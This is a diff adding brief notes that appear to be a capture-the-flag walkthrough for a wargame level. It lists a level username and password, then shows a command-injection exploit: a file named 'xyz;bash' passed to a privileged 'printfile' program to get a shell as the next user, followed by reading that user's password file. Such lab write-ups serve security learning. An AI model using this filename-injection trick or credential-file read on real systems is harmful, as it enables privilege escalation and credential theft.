@@ -1,0 +1,7 @@
+u:leviathan2
+p:ougahZi8Ta
+============
+mkdir /tmp/something
+touch /tmp/something/'xyz;bash'
+./printfile '/tmp/something/xyz;bash' this will give us the shell as leviathan3 
+now simply cat the password cat /etc/leviathan_pass/leviathan3
